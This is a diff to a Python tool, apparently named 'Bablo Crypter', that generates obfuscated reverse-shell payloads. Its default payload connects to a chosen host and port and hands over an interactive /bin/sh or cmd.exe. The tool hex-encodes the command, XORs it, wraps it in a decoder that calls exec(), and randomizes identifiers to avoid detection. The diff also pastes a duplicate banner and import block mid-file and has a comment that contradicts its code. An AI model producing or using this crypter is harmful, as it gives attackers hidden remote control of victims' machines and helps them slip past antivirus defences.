@@ -26,11 +26,43 @@ def print_banner(banner):
     banner_colored = "".join(char_r)
     print(banner_colored)
     
+#!/usr/bin/env python3
+import argparse
+import binascii
+import random
+import re
+
+from termcolor import colored
+
+banner = '''
+╭━━╮╱╱╱╭╮╱╱╱╱╱╱╱╭━━━╮╱╱╱╱╱╱╱╱╭╮
+┃╭╮┃╱╱╱┃┃╱╱╱╱╱╱╱┃╭━╮┃╱╱╱╱╱╱╱╭╯╰╮
+┃╰╯╰┳━━┫┃╭━━┳━━╮┃┃╱╰╋━┳╮╱╭┳━┻╮╭╋━━┳━╮
+┃╭━╮┃╭╮┃┃┃╭╮┃╭╮┃┃┃╱╭┫╭┫┃╱┃┃╭╮┃┃┃┃━┫╭╯
+┃╰━╯┃╭╮┃╰┫╰╯┃╰╯┃┃╰━╯┃┃┃╰━╯┃╰╯┃╰┫┃━┫┃
+╰━━━┻╯╰┻━┻━╮┣━━╯╰━━━┻╯╰━╮╭┫╭━┻━┻━━┻╯
+╱╱╱╱╱╱╱╱╱╭━╯┃╱╱╱╱╱╱╱╱╱╭━╯┃┃┃
+╱╱╱╱╱╱╱╱╱╰━━╯╱╱╱╱╱╱╱╱╱╰━━╯╰╯
+    
+    '''
+def print_banner(banner):
+    rainbow_colors = ["red", "magenta", "blue", "cyan", "green", "yellow", "white"]
+    char_r = list(banner)
+    for i in range(len(char_r)):
+        if char_r[i] != "\n":
+            char_r[i] = colored(char_r[i], random.choice(rainbow_colors))
+    banner_colored = "".join(char_r)
+    print(banner_colored)
+    
 # Function To Generate Random Names
 def randomize_name(name):
     name_length = len(name)
     random_name = ""
-    for i in range(name_length):
+
+    # Random Length Between 2 and 15
+    random_length = random.randint(10, 30) 
+
+    for i in range(random_length):
         random_name += chr(random.randint(97,122))
     return random_name
 
@@ -60,15 +92,18 @@ def randomize_names(payload):
 
     return payload
 
+
 def reverse_shell_gen(host, port, infile, outfile):
     if infile:
         with open(infile) as f:
             reverse_shell_command = f.read()
             modules = re.findall("import (.*)", reverse_shell_command)
-            modules = set(modules)
+            from_imports = re.findall("from (.*) import (.*)", reverse_shell_command)
+            modules = set(modules + [i[1] for i in from_imports])
     else:
-        reverse_shell_command = "import socket, subprocess, os; sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM);sock.connect(('{}',{}));os.dup2(sock.fileno(),0); os.dup2(sock.fileno(), 1); os.dup2(sock.fileno(),2);p=subprocess.call(['/bin/sh', '-i']);p.wait();".format(host, port)
+        reverse_shell_command = "import socket,subprocess,os;\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM);\ns.connect(('{}',{}));\nos.dup2(s.fileno(),0);\nos.dup2(s.fileno(),1);\nos.dup2(s.fileno(),2);\np=subprocess.call(['/bin/sh','-i']) if os.name=='posix' else subprocess.call(['cmd.exe'])".format(host,port)
         modules = set(["socket", "subprocess", "os"])
+        from_imports = []
 
     # Encoding The Reverse Shell Command into Hexadecimal
     encoded = reverse_shell_command.encode("utf-8").hex()
@@ -80,7 +115,7 @@ def reverse_shell_gen(host, port, infile, outfile):
         reverse_shell_payload += chr(encoded_char)
 
     #Generating Payload Script
-    payload_script = "import binascii\n%s\nencoded = '" % "\n".join(["import %s" % module for module in modules]) + reverse_shell_payload +  "'\n\ndef decode_reverse_shell(encoded):\n    decoded = ''\n    for char in encoded:\n        decoded += chr(ord(char) ^ 0xFF)\n    return binascii.unhexlify(decoded).decode('utf-8') \n\nreverse_shell_command = decode_reverse_shell(encoded) \nexec(reverse_shell_command)"
+    payload_script = "import binascii\n%s\nencoded = '" % "\n".join(["import %s" % module for module in modules if module not in [i[1] for i in from_imports]] + ["from %s import %s" % (i[0], i[1]) for i in from_imports]) + reverse_shell_payload +  "'\n\ndef decode_reverse_shell(encoded):\n    decoded = ''\n    for char in encoded:\n        decoded += chr(ord(char) ^ 0xFF)\n    return binascii.unhexlify(decoded).decode('utf-8') \n\nreverse_shell_command = decode_reverse_shell(encoded) \nexec(reverse_shell_command)"
 
     # Randomize Function Names And Variable Names
     payload_script = randomize_names(payload_script)
